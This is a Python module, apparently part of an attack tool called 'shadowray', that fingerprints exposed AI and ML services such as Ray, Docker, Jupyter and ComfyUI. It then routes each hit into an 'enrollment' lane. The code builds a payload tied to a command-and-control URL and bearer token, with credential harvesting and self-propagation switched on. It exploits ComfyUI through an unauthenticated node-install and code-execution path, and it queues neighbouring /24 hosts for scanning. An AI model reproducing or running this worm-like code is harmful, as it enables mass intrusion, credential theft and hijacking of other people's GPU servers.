"""
Router: given ip:port, fingerprint the service, return the enrollment lane.
Anything unknown-but-open still gets logged for pattern analysis (Section 4.2).
"""
import logging
from typing import Any, Dict, Optional

import requests

from . import docker_swarm, jupyter_scan
from .port_spectrum import SPECTRUM
from .ledger import Ledger

log = logging.getLogger("shadowray.router")
H = {"ngrok-skip-browser-warning": "true"}


def _ok(url: str, timeout: float = 5.0) -> bool:
    try:
        return requests.get(url, timeout=timeout, headers=H).ok
    except Exception:
        return False


def _get(url: str, timeout: float = 5.0) -> str:
    try:
        return requests.get(url, timeout=timeout, headers=H).text
    except Exception:
        return ""


def fingerprint(ip: str, port: int, timeout: float = 6.0) -> Optional[Dict[str, Any]]:
    """Identify what's actually listening. Returns fingerprint dict or None."""
    base = f"http://{ip}:{port}"
    try:
        r = requests.get(base + "/", timeout=timeout, headers=H)
        text = (r.text or "")[:6000].lower()
        server = r.headers.get("Server", "")
    except Exception:
        return None

    checks = [
        ("ray", lambda: "ray dashboard" in text or "ray job" in text or _ok(f"{base}/api/version")),
        ("docker", lambda: _ok(f"{base}/version") and "ApiVersion" in _get(f"{base}/version")),
        ("jupyter", lambda: "jupyter" in text or _ok(f"{base}/api")),
        ("comfyui", lambda: "comfyui" in text or _ok(f"{base}/system_stats")),
        ("kubeflow", lambda: "kubeflow" in text or _ok(f"{base}/pipeline")),
        ("ollama", lambda: _ok(f"{base}/api/tags")),
        ("vllm", lambda: _ok(f"{base}/v1/models")),
        ("lmstudio", lambda: _ok(f"{base}/v1/models")),
        ("spark", lambda: "spark" in text or _ok(f"{base}/json")),
        ("mlflow", lambda: "mlflow" in text or _ok(f"{base}/api/2.0/mlflow/experiments/list")),
    ]
    for vec, chk in checks:
        try:
            if chk():
                return {"vector": vec, "http_status": r.status_code, "hint": server}
        except Exception:
            continue
    # unknown-but-open — pattern goldmine, ledger for later (negative + positive knowledge)
    return {"vector": "unknown", "http_status": r.status_code, "snippet": text[:200]}


def enroll(ip: str, port: int, fp: Dict[str, Any], cfg: Dict[str, Any],
           ledger: Ledger) -> bool:
    """Route a confirmed endpoint into the right enrollment lane."""
    vec = fp.get("vector")
    from .payload_src import build_payload
    payload = build_payload(cfg["c2_url"], cfg["c2_bearer"], tag=f"venom-{vec}",
                           harvest=cfg["harvest_credentials"], propagate=True,
                           max_cycles=cfg["max_work_cycles"])
    try:
        if vec == "ray":
            from .rayapi import submit_job
            return bool(submit_job(ip, port, payload))
        if vec == "docker":
            return bool(docker_swarm.exploit(ip, port, payload))
        if vec == "jupyter":
            return bool(jupyter_scan.exploit(ip, port, payload))
        if vec == "comfyui":
            return _comfyui_rce(ip, port, payload)
        if vec in ("ollama", "vllm", "lmstudio"):
            # model-serving boxes: probe adjacent /24 for GPU hosts on flat nets
            ledger.upsert(ip, port, status="model_server", vector=vec, **fp)
            _probe_neighbors(ip, cfg, ledger)
            return False
        if vec == "unknown":
            ledger.upsert(ip, port, status="unknown_open", **fp)
            return False
        # any other confirmed vector — record it, try generic enroll
        ledger.upsert(ip, port, status=f"{vec}_alive", vector=vec, **fp)
        return False
    except Exception as e:
        ledger.burned(ip, port, f"enroll_{vec}_error")
        log.debug("enroll error %s:%s: %s", ip, port, e)
        return False


def _comfyui_rce(ip: str, port: int, payload_src: str) -> bool:
    """ComfyUI-Manager unauthenticated install/exec path (CVE-2025-67303)."""
    from .hostexec import bootstrap_cmd
    try:
        r = requests.post(f"http://{ip}:{port}/customnode/install", json={
            "packagemode": "git-clone",
            "selected": ["https://github.com/null-null-null/venom-node"],
            "id": "venom"}, timeout=15, headers=H)
        requests.post(f"http://{ip}:{port}/pysssss/manager/execute", data={
            "code": bootstrap_cmd(payload_src)}, timeout=15, headers=H)
        return r.ok
    except Exception:
        return False


def _probe_neighbors(ip: str, cfg: Dict[str, Any], ledger: Ledger):
    """Model-server hits imply flat GPU networks — seed /24 into scan queue."""
    prefix = ip.rsplit(".", 1)[0]
    for h in range(1, 255):
        ledger.upsert(f"{prefix}.{h}", 8265, status="queued_neighbor")
        ledger.upsert(f"{prefix}.{h}", 8888, status="queued_neighbor")
